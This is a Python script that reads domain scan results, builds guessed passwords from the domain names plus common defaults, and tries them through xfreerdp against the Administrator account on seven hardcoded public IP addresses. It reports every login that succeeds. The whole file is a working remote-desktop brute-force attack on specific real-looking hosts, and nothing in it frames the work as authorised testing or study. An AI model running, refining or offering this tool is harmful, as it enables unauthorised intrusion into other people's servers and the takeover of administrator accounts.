import json, glob, subprocess

ip_pws = {}
for f in glob.glob("/tmp/scan_results/*.json"):
    d = json.load(open(f))
    name = d["domain"].split(".")[0]
    for ip in d.get("ips", []):
        if ip not in ip_pws:
            ip_pws[ip] = set()
        ip_pws[ip].update([name, name+"123", name+"888", name+"2024", name+"2025", name.capitalize(), name.capitalize()+"123"])

targets = ["117.50.115.224","121.196.233.163","123.57.180.20","139.129.193.165",
           "221.231.138.20","47.99.196.80","59.110.169.32"]

for ip in targets:
    pws = list(ip_pws.get(ip, [])) + ["100206","admin123","admin888","123456","password","P@ssw0rd"]
    pws = list(set(pws))[:12]
    found = False
    for pw in pws:
        try:
            r = subprocess.run(["timeout","10","xvfb-run","-a","xfreerdp",
                "/v:"+ip,"/u:administrator","/p:"+pw,
                "/cert-ignore","/auth-only","+sec-nla"],
                capture_output=True, text=True, timeout=12)
        except:
            continue
        if "exit status 0" in r.stdout + r.stderr:
            domain = "?"
            for f in glob.glob("/tmp/scan_results/*.json"):
                d = json.load(open(f))
                if ip in d.get("ips", []):
                    domain = d["domain"]
                    break
            print("CONFIRMED: %s (%s) Administrator/%s" % (ip, domain, pw))
            found = True
            break
    if not found:
        print("%s: no match" % ip)
